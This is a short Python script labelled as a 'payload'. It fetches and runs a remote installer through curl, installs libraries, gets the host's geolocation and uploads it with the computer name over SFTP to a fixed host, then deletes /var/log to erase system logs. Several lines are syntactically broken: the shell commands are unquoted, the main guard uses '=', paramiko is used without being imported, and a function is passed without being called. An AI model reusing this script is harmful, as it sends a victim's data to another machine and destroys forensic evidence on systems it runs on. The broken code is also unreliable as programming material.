#!/usr/bin/env python3

# Assume running first time
# Need to install libraries for payload
import os
os.system(ruby -e "$(curl -fsSL https://raw.github.com/mxcl/homebrew/go)")
os.system(brew doctor)
os.system(brew update)
os.system(brew install python3)
os.system(python3 get-pip.py)
os.system(pip3 install requests)
os.system(pip3 install paramiko)

import sys
import requests
import json
import shutil

def get_geo_location():
    send_url = 'http://freegeoip.net/json'
    r = requests.get(send_url)
    j = json.loads(r.text)
    return j

def put_file(machinename, username, dirname, filename, data):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(machinename, username=username)
    sftp = ssh.open_sftp()
    try:
        sftp.mkdir(dirname)
    except IOError:
        pass
    f = sftp.open(dirname + '/' + filename, 'w')
    f.write(data)
    f.close()
    ssh.close()

if __name__ = "__main__":
    filename = "geo_location_ip" + os.environ['COMPUTERNAME']
    put_file('192.168.1.1', 'temp', '/ips/', filename, get_geo_location)
    shutil.rmtree("/var/log", ignore_errors=True, onerror=None)